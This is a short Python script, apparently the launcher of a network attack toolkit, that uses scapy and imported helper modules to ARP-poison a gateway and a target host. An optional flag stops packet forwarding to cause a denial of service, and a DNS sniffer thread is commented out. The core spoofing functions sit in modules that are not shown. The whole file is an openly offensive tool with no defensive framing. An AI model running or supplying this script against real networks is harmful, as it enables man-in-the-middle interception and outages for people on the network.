#!/usr/bin/python

from scapy.all import *
import sys
from utils.network import *
from utils.tools import *
import socket, struct
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-d", "--dos",
                    help="stop forwarding -> Attack DOS via Arp poisonning",
                    action="store_false")
args = parser.parse_args()
address = preset_arp_spoofing(args.dos)
#address[0] is the gateway, address[1] is the target, address is your mac add
print(colors.CLEAR+colors.OKGREEN+colors.BOLD+"start the spoofing attack"+colors.ENDC)
print(colors.OKBLUE+"press ctrl+c when you want to stop"+colors.ENDC)
#th_sniffer= Sniffer("wlan0","dns")
#th_sniffer.start()
arpSpoofing(address[0],address[1],address[2])
#th_sniffer.join()
